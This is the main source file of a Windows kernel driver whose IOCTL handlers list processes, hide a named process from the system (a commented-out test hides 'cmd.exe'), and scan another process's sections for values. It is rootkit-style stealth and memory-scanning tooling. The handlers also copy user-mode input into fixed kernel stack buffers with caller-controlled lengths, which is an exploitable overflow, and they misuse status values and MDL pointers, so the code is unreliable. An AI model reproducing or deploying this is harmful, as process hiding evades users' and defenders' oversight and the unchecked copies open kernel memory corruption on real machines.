#include "Driver.h"
#include "ProcTools.h"
#include "MemTools.h"

PDEVICE_OBJECT device; 
UNICODE_STRING device_path = RTL_CONSTANT_STRING(L"\\Device\\driver_project_log");
UNICODE_STRING symbolic_link_path = RTL_CONSTANT_STRING(L"\\??\\symbolic_link_device_log");


NTSTATUS deviceCreate(PDEVICE_OBJECT device_obj, PIRP irp)
{
	UNREFERENCED_PARAMETER(device_obj);
	UNREFERENCED_PARAMETER(irp);

	dprint("connected to user-mode\n\n");
	IoCompleteRequest(irp, IO_NO_INCREMENT);
	return NTSTATUS(1);
}

NTSTATUS deviceClose(PDEVICE_OBJECT device_obj, PIRP irp)
{
	UNREFERENCED_PARAMETER(device_obj);
	UNREFERENCED_PARAMETER(irp);

	dprint("connection to user-mode closed\n\n");
	IoCompleteRequest(irp, IO_NO_INCREMENT);
	return NTSTATUS(1);
}

NTSTATUS deviceCleanUp(PDEVICE_OBJECT device_obj, PIRP irp)
{
	UNREFERENCED_PARAMETER(device_obj);
	UNREFERENCED_PARAMETER(irp);

	dprint("cleanup\n\n");
	IoCompleteRequest(irp, IO_NO_INCREMENT);
	return NTSTATUS(1);
}

NTSTATUS deviceCtrl(PDEVICE_OBJECT device_obj, PIRP irp)
{
	dprint("device controll check \n\n");
	UNREFERENCED_PARAMETER(device_obj);
	checkMemoryReading();

	// getting the code of the request -> what action the client wants to commit
	PIO_STACK_LOCATION loc = IoGetCurrentIrpStackLocation(irp);
	long request_code = loc->Parameters.DeviceIoControl.IoControlCode;

	int res = 0, output_size = 0;

	switch (request_code)
	{
	case PROC_LISTP_CODE: {// in case the client wanted to use the process list tool
		// getting the list 
		dprint("list check \n\n");

		char buffer[ROTATION_LIMIT * NAME_SIZE] = "";
		res = listProcesses(buffer);
		DbgPrintEx(0, 0, "\n\nresulte : %s \n\n", buffer);
		RtlCopyMemory((char*)irp->AssociatedIrp.SystemBuffer, buffer, res);

		output_size = res;
		break;
	}
	case PROC_HIDE_CODE: { // in case the client ask to use the process hiding tool
		// get the name of the process
		char name[NAME_SIZE] = "";
		long name_size = loc->Parameters.Write.Length;
		strncpy(name, (char*)irp->AssociatedIrp.SystemBuffer, name_size);

		dprint("hide check \n\n");
		// hiding the process
		res = hideProcess(name);
		break;
	}
	case PROC_SEARCH_CODE: { // in case the client ask to use the variable search tool 

		/* ioclt input layout : 4 bytes->value to search | 2 bytes->amount of sections
		      | 8 bytes * amount of section -> sections array */

		// getting the value to search
		int dst_val = 0;
		strncpy((char*)&dst_val, (char*)irp->AssociatedIrp.SystemBuffer, sizeof(int));

		int sec_amount = 0;
		strncpy((char*)&sec_amount, (char*)irp->AssociatedIrp.SystemBuffer + sizeof(int), 2);

		dprint("start\n");
		char* out_buffer = (char*)irp->MdlAddress;
		int out_counter = 0;
		for (int i = 0; i < sec_amount; i++)
		{
			// get the name of the section 
			char sec_name[IMAGE_SIZEOF_SHORT_NAME] = "";
			memcpy(sec_name, (char*)irp->AssociatedIrp.SystemBuffer + sizeof(int) + 2 + (i * IMAGE_SIZEOF_SHORT_NAME), IMAGE_SIZEOF_SHORT_NAME);
			dprint("\nstarting search\n");
			dprint("a\n");
			darray arr = searchThroughSection(sec_name, dst_val); // search the val in the section 
			if (arr.a == nullptr) {
				res = false;
				output_size = 0;
				goto end;
			}
			dprint("b\n");
			memcpy(out_buffer + out_counter, &(arr.used), 1); // initing the amount of locs found t=in this section 
			out_counter++; 
			dprint("c\n");
			for (int j = 0; j < arr.used; j++)
			{
				// copying the curr location to the output buffer 
				memcpy(out_buffer + out_counter, (char*)(arr.a) + (j * sizeof(int)), sizeof(int));
				out_counter += sizeof(int);
				dprint("d\n");
			}

			arrFree(arr);
			dprint("e\n");
		}
		dprint("f\n");
		res = true;
		output_size = out_counter;
		break;
	}
	case PROC_INIT_INFO_CODE: {
		// get the name of the process
		char name[NAME_SIZE] = "";
		long name_size = loc->Parameters.Write.Length;
		strncpy(name, (char*)irp->AssociatedIrp.SystemBuffer, name_size);

		res = initilizeProcessInfo(name); // initilize the info 
		dprint(res ? "\ntrue\n" : "\nfalse\n");
		break;
	}
	case PROC_LISTS_CODE: {
		// collecting the names of the sections
		listSections((char*)irp->AssociatedIrp.SystemBuffer);

		// calculating the overall size of all the names 
		output_size = getNumberOfSection() * IMAGE_SIZEOF_SHORT_NAME;
		res = true;
		break;
	}
	default: // in case the requeast was not for one of the driver tools, return an invalid request code
		irp->IoStatus.Status = (STATUS_INVALID_DEVICE_REQUEST);
		irp->IoStatus.Information = 0;
		dprint("default check \n\n");
		return 0;
		break;
	}
	dprint("-a-");

end:

	irp->IoStatus.Information = output_size;
	irp->IoStatus.Status = res ? STATUS_SUCCESS : STATUS_INVALID_DEVICE_REQUEST;
	dprint("-b-");
	IoCompleteRequest(irp, IO_NO_INCREMENT);
	dprint("-c-");
	return res ? STATUS_SUCCESS : STATUS_INVALID_DEVICE_REQUEST;
}


VOID DriverUnload(PDRIVER_OBJECT driver_obj)
{
	IoDeleteDevice(device);
	IoDeleteSymbolicLink(&symbolic_link_path);

	dprint("\n\n\nby fuckers\n\n");
	UNREFERENCED_PARAMETER(driver_obj);
}

NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT driver_obj, _In_ PUNICODE_STRING reg_path)
{
	UNREFERENCED_PARAMETER(reg_path);	
	driver_obj->DriverUnload = DriverUnload;

	dprint("\n\n\nHELLO WORLD\n\n");

	NTSTATUS s_code = IoCreateDevice(driver_obj, 0, &device_path, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, false, &device);

	if (!NT_SUCCESS(s_code))
	{
		dprint("\n\nFAILD TO CREATE DEVICE OBJ. EXISTING... \n\n");
		return s_code;
	}

	s_code = IoCreateSymbolicLink(&symbolic_link_path, &device_path);

	if (!NT_SUCCESS(s_code))
	{
		dprint("\n\nFAILD TO CREATE SYMBOLIC LINK. EXISTING... \n\n");
		return s_code;
	}

	
	driver_obj->MajorFunction[IRP_MJ_DEVICE_CONTROL] = deviceCtrl;
	driver_obj->MajorFunction[IRP_MJ_CLEANUP] = deviceCleanUp;
	driver_obj->MajorFunction[IRP_MJ_CLOSE] = deviceClose;
	driver_obj->MajorFunction[IRP_MJ_CREATE] = deviceCreate;

	/*if (!printProcesses())
		dprint("\n\n\n ERROR WHILE PRINTING PROCESESS - MAX LOOP ROTATIONS EXCEEDED \n\n\n");

	printCurrentProcessName();
	char name[] = "cmd.exe";
	hideProcess(name);
	*/
	char tmp[NAME_SIZE * ROTATION_LIMIT] = "";
	int res = listProcesses(tmp);
	DbgPrintEx(0, 0, "\n\n lenght size: %d\n\n", res);

	return NT_SUCCESS(1);
}


void lowercase(const char src[], char res[])
{
	for (size_t i = 0; i < strlen(src); i++)
	{
		res[i] = (char)tolower((int)src[i]);
	}
}

